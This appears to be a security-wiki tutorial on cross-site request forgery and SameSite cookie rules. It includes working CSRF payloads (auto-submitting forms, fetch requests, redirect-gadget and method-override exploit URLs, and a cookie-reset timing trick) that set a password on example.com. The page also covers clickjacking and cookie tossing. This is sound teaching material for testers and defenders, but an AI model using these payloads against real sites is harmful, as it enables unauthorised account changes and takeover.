---
description: >-
  Submitting data-altering requests blindly from your domain on the client-side.
  Cookies are automatically sent, often requiring CSRF tokens as protection
---

# Cross-Site Request Forgery (CSRF)

## Description

Websites need to be able to access their own sensitive content, while malicious websites should not be able to access that same data from another site. To make this possible, _browsers_ implement some **same-origin** and **same-site** policies. These either allow or deny an action based on the **origins** of the request. As you can read in the table below, _same-site_ is generally more allowing than _same-origin_:

<table><thead><tr><th width="244">Request from</th><th width="216">Request to</th><th>Same-site?</th><th>Same-origin?</th></tr></thead><tbody><tr><td><code>example.com</code></td><td><code>example.com</code></td><td><mark style="color:green;"><strong>Yes</strong></mark></td><td><mark style="color:green;"><strong>Yes</strong></mark></td></tr><tr><td><code>app.example.com</code></td><td><code>other.example.com</code></td><td><mark style="color:green;"><strong>Yes</strong></mark></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched domain name</td></tr><tr><td><code>example.com</code></td><td><code>example.com:8080</code></td><td><mark style="color:green;"><strong>Yes</strong></mark></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched port</td></tr><tr><td><code>example.com</code></td><td><code>example.co.uk</code></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched <a href="https://publicsuffix.org/">eTLD</a></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched domain name</td></tr><tr><td><code>https://example.com</code></td><td><code>http://example.com</code></td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched scheme</td><td><mark style="color:red;"><strong>No</strong></mark>: mismatched scheme</td></tr></tbody></table>

Another term important to cookies is when requests are **'top-level'** or not. One simple definition is if the address bar matches the request being made. Redirection or `window.open()`, for example, are top-level navigations. A `fetch()` or `<iframe>`, however, are not, because the address bar shows a different address to the resource being requested.

### Same-origin & CORS

One feature that uses the **same-origin** policy is [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). This prevents an attacker from requesting a page from a website on a user's behalf and being able to read the response content. If this were not the case, any website could steal secrets from any other website by simply requesting them. \
This policy ensures certain response headers are explicitly set to allow cross-origin resource sharing.&#x20;

* [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)`: <origin> | *`: If this header is missing, no other origins are allows to read the body. If it is a valid origin, the body may be read if the requesting origin is the same as that in this header. If the value is "`*`" (wildcard), any origin may read the body.
* [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)`: true`: If this header is missing, it is interpreted as `false`. If it is instead explicitly set to `true`, the incoming request made by `fetch()` may include cookies, only if `...-Allow-Origin` is not `*` during the preflight request. \
  It must be a full origin. This is why some APIs simply reflect the incoming `Origin` header to allow any site to include cookies.

Fetch requests must explicitly ask to include cookies if they want to send cookies and read a response. This is done using the [`credentials:`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch\_API/Using\_Fetch#sending\_a\_request\_with\_credentials\_included) option. If by the [#same-site](cross-site-request-forgery-csrf.md#same-site "mention") rules explained below your background request is allowed to include cookies, and the `Access-Control` headers allow it, the following request will be authenticated and allow you to read the response cross-site:

```javascript
fetch("http://example.com/some_data", { 
    credentials: 'include' 
}).then((r) => r.text().then((t) => {
    console.log(t);
}));
```

## Same-site

A different feature that uses the **same-site** policy is **Cookies**. On many websites cookies are everything that authenticates the user. If a request includes the session cookie of a user, they are allowed to perform actions on their account. Simple as that.\
To make sure malicious websites cannot simply recreate a `<form>` and send it automatically to change a password, for example, these requests are checked to be _same-site_ (see table above). If the origins are not same-site the cookies will not be sent.&#x20;

In the early web days, this `SameSite` did not exist for cookies. Nowadays it is an attribute on cookies that may be `None` (no protections), `Lax` (default, some protections) or `Strict` (most protections).&#x20;

This value is important to know as it decides what kind of cross-site requests will be authenticated. The table above shows that at least **any subdomain on any port** will **bypass** same-site protections because it is considered same-site. This means that any [cross-site-scripting-xss.md](cross-site-scripting-xss.md "mention") vulnerability on such a website may lead to you being able to make authenticated requests!

All `SameSite=` values have the following meanings:

1. `SameSite=`<mark style="color:red;">**`None`**</mark>: _All_ cross-site requests to the cookie's origin will include cookies.&#x20;
2. `SameSite=`<mark style="color:blue;">**`Lax`**</mark>: _Only_ top-level GET requests will contain the cookie. Any other requests such as POST, `<iframe>`'s, `fetch()` or other background requests will not include this cookie.
3. `SameSite=`<mark style="color:green;">**`Strict`**</mark>: _No_ cross-site requests will include cookies. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie. A redirect is not sufficient here, as the origin at the time of redirection is still yours instead of the target.
4. `SameSite` is <mark style="color:yellow;">**missing**</mark>: When the attribute is not explicitly set for a cookie, it gets a little complicated because the browser tries to be backward compatible. For _Firefox_, the value will be **None** by default, with no restrictions. For _Chromium_, however, the value will be **Lax\*** by default. \
   \* This asterisk is saying that for the first 2 minutes of the cookie being set, it will be sent on cross-site top-level POST requests, in contrast to the normal Lax behaviour. After this 2-minute window, the behaviour mimics Lax completely, disallowing cross-site top-level POST requests again.&#x20;

### Third-party cookie protections

While the above rules covered everything for a long time, privacy and tracking concerns pushed browsers to limit cross-site cookies even more. These rules only restrict requests that are not top-level. When you make a `fetch()` request, for example, the cookies will not be included, even if `SameSite=None`! This rule adds to the regular same-site rules.

All browsers are implementing this in slightly different ways, check out the documentation for each:

* Chromium: [Privacy Sandbox Tracking Protection](https://developers.google.com/privacy-sandbox/3pcd)
* Firefox: [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop#w\_what-enhanced-tracking-protection-blocks)
* Safari: [Intelligent Tracking Prevention](https://webkit.org/blog/9521/intelligent-tracking-prevention-2-3/)

Because this movement is still in progress, there are some 'Heuristics based exceptions' to these rules that make cookies behave like before. This is to prevent certain authentication flows from breaking and include the following bypasses because it is not a security feature:

* [Chromium Heuristics](https://developers.google.com/privacy-sandbox/3pcd/temporary-exceptions/heuristics-based-exceptions): `window.open()` the target site and receive an interaction on the popup, whitelisting your site for 30 days for to access the target's third-party cookies from your site that opened it.
* [Firefox Heuristics](https://developer.mozilla.org/en-US/docs/Web/Privacy/State\_Partitioning#storage\_access\_heuristics): `window.open()` the target site once (no interaction required), whitelisting your site for 30 days

{% embed url="https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/" %}
Research on this topic in major browsers, explaining more details
{% endembed %}

{% hint style="info" %}
**Tip**: For testing, you can manually disable these protections in Chromium with the ![](<../.gitbook/assets/image (49).png>) icon, and in Firefox with the blue ![](<../.gitbook/assets/image (50).png>) icon, both in the address bar for affected sites.
{% endhint %}

### Attack Examples

To get a more practical idea of these protections, here are some examples of what is and isn't allowed in modern browsers. Firstly, some practical examples of how an attacker's site can send POST data to another site if it is misconfigured:

{% code title="Using <form> (top-level)" overflow="wrap" %}
```html
<form id=form action="https://example.com/reset_password" method="POST" enctype="application/x-www-form-urlencoded">
    <input type="text" name="password" value="hacked">
</form>
<script>
    // Automatically submit
    form.submit();
</script>
```
{% endcode %}

{% code title="Using fetch() (background)" %}
```html
<script>
    fetch('https://example.com/reset_password', {
        method: 'POST',
        mode: 'no-cors',  // Prevent preflight request or errors
        credentials: 'include',  // Include cookies if allowed
        headers: {  // Parse body as form submission
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: 'password=hacked',
    })
</script>
```
{% endcode %}

Here both methods can achieve the same requests, but notice that one is top-level, while the other is not. The `<form>` method will work when the SameSite attribute is missing in Chromium-based browsers for the first 2 minutes of the cookie being set, as well as bypassing [#third-party-cookie-protections](cross-site-request-forgery-csrf.md#third-party-cookie-protections "mention") automatically. The `fetch()` method is more hidden but has more preconditions.&#x20;

With the `fetch()` method you can completely control the body data while using a `<form>` this is done for you depending on the `Content-Type` header (`enctype=` in HTML). \
This type can be changed to one of three values, which all have different formats. The `text/plain` type may be interesting if a server expects the `application/json` type which is normally impossible, but also accepts this as an alternative. Here are all three:

<pre class="language-http"><code class="lang-http">Content-Type: application/x-www-form-urlencoded
<strong>name1=value1&#x26;name2=value2
</strong>
Content-Type: multipart/form-data
<strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ
</strong><strong>Content-Disposition: form-data; name="name1"
</strong><strong>
</strong><strong>value1
</strong><strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ
</strong><strong>Content-Disposition: form-data; name="name2"
</strong><strong>
</strong><strong>value2
</strong><strong>------WebKitFormBoundaryS9COBpBA97fjAsLJ--
</strong>
Content-Type: text/plain
<strong>name1=value1
</strong><strong>name2=value2
</strong></code></pre>

#### `SameSite=`<mark style="color:red;">`Strict`</mark>: bypassing using client-side redirect

As mentioned earlier, the SameSite protection only prevents cross-_site_ requests. If you can create a fake form or have javascript execution on a **sibling domain or different port**, this bypasses the restriction.&#x20;

If this is not possible, there is [another interesting method](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-restrictions-using-on-site-gadgets). It's impossible to send an authenticated request from your own site, so why not try to send a request from the site you are already targeting? Any requests like **client-side redirects** will be **authenticated** because you are on the same site. For this to work the target endpoint that you want to execute, such as `/reset_password`, will need to allow GET requests with parameters. In a very flexible framework, this behavior might be common as query and body parameters are merged.&#x20;

Take the following gadget, which allows an unauthenticated client-side redirect using a parameter:

{% code title="Client-side redirect" %}
```javascript
// Redirect '?postId=42' to '/post/42'
const postId = new URL(location).searchParams.get("postId");
location = "/post/" + postId;
```
{% endcode %}

Note that while this is in a GET response, an unauthenticated POST response might also have a gadget like this to abuse. We can send such a request using the `<form>` technique from above. &#x20;

This gadget can be abused because after redirecting to this location from our malicious site, the next redirect will be authenticated as it is coming from the same site. Using a directory traversal sequence in the `?postId=` query parameter we can make it redirect to the vulnerable state-changing GET endpoint that was our initial target, and it will be authenticated with Cookies:

{% code title="Exploit URL" %}
```python
https://example.com/post?postId=../reset_password%3Fpassword%3Dhacked
```
{% endcode %}

#### `SameSite=`<mark style="color:blue;">`Lax`</mark>: method override

If you find a state-changing GET request or can trick the server into thinking a GET request is a POST request, you may still find impact. With backends like _PHP Symfony_ that have an extra `?_method=POST` parameter that can be set in a regular GET request to override the method internally:

{% code title="Exploit URL" %}
```python
https://example.com/reset_password?_method=POST&password=hacked
```
{% endcode %}

#### `SameSite=`<mark style="color:red;">`None`</mark>: Background requests

With this SameSite attribute, the cookie is treated as before SameSite was implemented. This means any techniques like the `<form>` or `fetch()` will work and send cookies using any request method. In such cases, you should check if any CSRF tokens are required; if not, there's a good chance you can make any victim send any state-changing request when they visit your site.&#x20;

#### `SameSite` is <mark style="color:yellow;">**missing**</mark>: `None` or abusing the 2-minute window

Remember that _Firefox_, a major browser, still defaults to `SameSite=None` when a cookie misses this attribute. On _Chromium_ browsers, it will still allow top-level POST requests for 2 minutes after the cookie is set, before fully committing to `SameSite=Lax`.&#x20;

This behaviour has a small chance of a victim just having logged in being exploitable. This is pretty unlikely, but a more powerful way to use this is if the site allows **resetting the cookie**. When it is set again by opening a new tab from your site, the timer is also reset and a CSRF is possible.&#x20;

{% code title="Exploit HTML" %}
```html
<form id=form action="https://example.com/reset_password" method="POST">
    <input type="text" name="password" value="hacked">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        // Reset cookie
        window.open('https://example.com/login');
        setTimeout(() => {
            // After it has been reset, CSRF well within the 2-minute window
            form.submit();
        }, 5000);
    }
</script>
```
{% endcode %}

### Other cookie attacks

If CSRF attacks are not possible due to protections like [#csrf-tokens](cross-site-request-forgery-csrf.md#csrf-tokens "mention"), but the SameSite attribute is still quite forgiving, there are more techniques involving the auto-sending behaviour of most cookies. Most involve **references to a window** of the target site being authenticated. This can either be a top-level context using `window.open()` or redirection with `location=`, or a third-party context using `<iframe>`'s.&#x20;

Here are some examples of how to get window reference containing your target:

<pre class="language-html"><code class="lang-html">&#x3C;script>
    // Blocked by popup-blocker by default, because no interaction triggered it
    window.open("https://example.com");
    // Successfully open a *new tab* of 'example.com' upon clicking anywhere
    let w1;
<strong>    onclick = () => {
</strong><strong>        w1 = window.open("https://example.com");
</strong><strong>        console.log(w1);
</strong><strong>    }
</strong>    // Successfully open a *popup* of 'example.com' upon clicking anywhere
    let w2;
<strong>    onclick = () => {
</strong><strong>        w2 = window.open("https://example.com", '', 'width=100,height=100');
</strong><strong>        console.log(w2);
</strong><strong>    }
</strong>&#x3C;/script>
</code></pre>

#### [Clickjacking](https://portswigger.net/web-security/clickjacking)

If the target page allows being put into an `<iframe>`, your site above the iframe can put a barely transparent overlay over the frame to trick the user into clicking certain parts of the frame. This technique known as 'clickjacking' requires cookies in a third-party context, and thus `SameSite=None`, but can be very effective if there is enough reason for the user to follow your instructions, like a game or a captcha.&#x20;

Instead of clicks, this technique can go even further with overwriting clipboard/drag data to make the user unintentionally fill in forms, or carefully show parts of the iframe to make the user re-type what is on their screen back to you.&#x20;

#### [XS-Leaks](https://xsleaks.dev/)

XS-Leaks are a more recently developed attack surface that can go very deep. The idea is to abuse your window reference or probe the requests to the target site in order to leak some information about the response. A common exploit for this is detecting if something exists, like a private project URL or query result. By repeating leaks for search functionality, you can find strings included in the response slowly to exfiltrate data from a response cross-site (called 'XS-Search').&#x20;

#### [Cookie Tossing](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-tossing)

[This post](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) and [this writeup](https://github.com/google/google-ctf/tree/main/2024/quals/web-game-arcade#subdomain) show examples of this technique. From a subdomain, it is possible to set cookies on any other subdomain or main domain. For example, from the `xss.example.com` domain you could set a `payload=...; domain=example.com` cookie to add a cookie to another domain. This can lead to all sorts of attacks like Self-XSS becoming exploitable, messing with flows, etc. because a developer may not expect the attacker to have control over the victim's cookies.&#x20;

Using the `path=/some/path` cookie attribute, you can even force the cookies to one specific path. The other cookies from the victim will stay active on other pages, potentially leading to complex attacks where different sessions are used ([more info](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#define\_where\_cookies\_are\_sent)).

#### [postMessage Exploitation](cross-site-request-forgery-csrf.md#postmessage-exploitation)

## Protection: CSRF Tokens

However, the reality is slightly more complicated. Because these rules are so lax, most sites implement their own protection: **CSRF Tokens**. These are extra fields on a form that are randomly generated, but attached to the user's session. Whenever a form is submitted, the extra CSRF token field is validated to match the session and only then will it be considered authenticated. \
A malicious site won't know this randomly generated token and therefore cannot make a fake request that includes it. This is assuming however that:

1. This token is _implemented;_
2. This token is _generated securely;_
3. This token is _unique per user_.

{% embed url="https://portswigger.net/web-security/csrf/bypassing-token-validation" %}
Explanation of various common mistakes in CSRF tokens, and how to exploit them
{% endembed %}
